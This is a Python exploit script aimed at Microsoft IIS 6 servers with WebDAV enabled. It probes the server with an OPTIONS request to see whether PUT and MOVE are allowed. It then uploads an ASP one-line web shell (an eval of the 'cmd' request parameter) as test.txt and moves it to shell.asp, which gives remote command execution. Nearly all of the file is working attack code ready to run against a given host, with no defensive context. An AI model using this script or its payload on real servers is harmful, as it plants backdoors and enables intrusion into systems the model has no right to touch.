import socket
import sys




def judge_iis6_put(sock,url) -> int:
    data = """
OPTIONS / HTTP/1.1
Host: """+url+"""
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1


    """
    sock.sendall(bytes(data,'utf-8'))
    rec=sock.recv(2048)
    sock.close()
    if bytes('PUT','utf-8') in rec and bytes('MOVE','utf-8') in rec:
        return 1
    return 0


def put_exp(sock,url) -> int:
    exp1="""
PUT /test.txt HTTP/1.1
Host: """+url+"""
Content-Length: 25


<%eval request("cmd")%>
    """


    exp2="""
MOVE /test.txt HTTP/1.1
Host: """+url+"""
Destination: http://upload.moonteam.com/shell.asp




    """
    sock.sendall(bytes(exp1,'utf-8'))
    rec = sock.recv(1024)
    if bytes('Created','utf-8') in rec:
        sock.sendall(bytes(exp2,'utf-8'))
        rec = sock.recv(1024)
        sock.close()
        if bytes('Created','utf-8') in rec:
            return 1
        return 0
    sock.close()
    return 0
         


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('eg:python iis6Input.py www.example.com 127.0.0.1')
        sys.exit(1)
    s1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s1.connect((sys.argv[2],80))
    if judge_iis6_put(s1,sys.argv[1]):
        print('发现存在iss6x input漏洞\n尝试上传exp....')
        s2 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s2.connect((sys.argv[2],80))
        if put_exp(s2,sys.argv[1]):
            print('exp上传成功!!!')
        else:
            print('exp上传失败!!!')
